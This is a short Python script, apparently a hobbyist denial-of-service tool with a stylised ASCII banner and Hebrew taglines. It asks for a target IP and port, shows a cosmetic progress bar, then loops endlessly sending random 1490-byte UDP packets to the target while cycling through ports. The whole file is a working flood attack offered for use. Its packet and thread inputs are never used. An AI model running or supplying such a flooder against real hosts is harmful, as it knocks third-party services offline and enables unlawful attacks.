import sys
import os
import time
import socket
import random
import fade
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
logo = """
  ___________    ____      ________      ___  ___  ______      __
  \_______   |  /    \    /  ____/ \    /  / /  / /  ___  \   /  /
         /  /  /  /\  \  |  /    \  \  /  / /__/ |__|  |  |  /  /___
        /  /  /  /  \  \ |  |     \  \/  /            /  /  /  //  |
       /  /  /  /    \  \|  |      /    \            /  /  /  /_|  |
      /  /  /  /______\  \  |     /  /\  \          /  /  /_____   |     
     /  /__/____________  \ \____/  /  \  \        /  /_____    |  |
    |__________/        \__\_____/_/    \__\      |________/    |__|
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[96m                       התקפות מפסידות ללא הגבלה
║\033[92m                          השתמש במטרה טובה 
║\033[33m                     אל תתקוף את מה שלא כדאי לך
║\033[36m                             ———oO0Oo———
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
"""
faded_text = fade.fire(logo)
print(faded_text)
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
time.sleep(5),
print("\033[96m[\033[31m+\033[96m] -------⟩⟩ 15% \033[0m "),
time.sleep(5),
print("\033[92m[\033[31m+\033[92m] -------------⟩⟩ 25% \033[0m "),
time.sleep(5),
print("\033[94m[\033[31m+\033[94m] ------------------⟩⟩ 50% \033[0m "),
time.sleep(5),
print("\033[97m[\033[31m+\033[97m] ----------------------⟩⟩ 75% \033[0m "),
time.sleep(5),
print("\033[95m[\033[31m+\033[95m] -------------------------⟩⟩ 100% \033[0m ")
time.sleep(5),
print("\033[96m[\033[31m+\033[96m]        START GO...!! \033[0m "),

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"\033[97m[\033[99m+\033[97m]   Sent  \033[94mPacket:::.... " +ip+ "\033[0m" )
     print("\033[33m———————————————————————————————————————————⟩⟩")
     print(f"\033[93m[\033[99m+\033[93m]   Attack  \033[95mWebs:::.... " +ip+ "\033[0m" )
     print("\033[94m———————————————————————————————————————————⟩⟩")
     print(f"\033[95m[\033[99m+\033[95m]   Request  \033[32mFull:::... " +ip+ "\033[0m" )
     print("\033[31m———————————————————————————————————————————⟩⟩")
     if port == 65534:
       port = 1


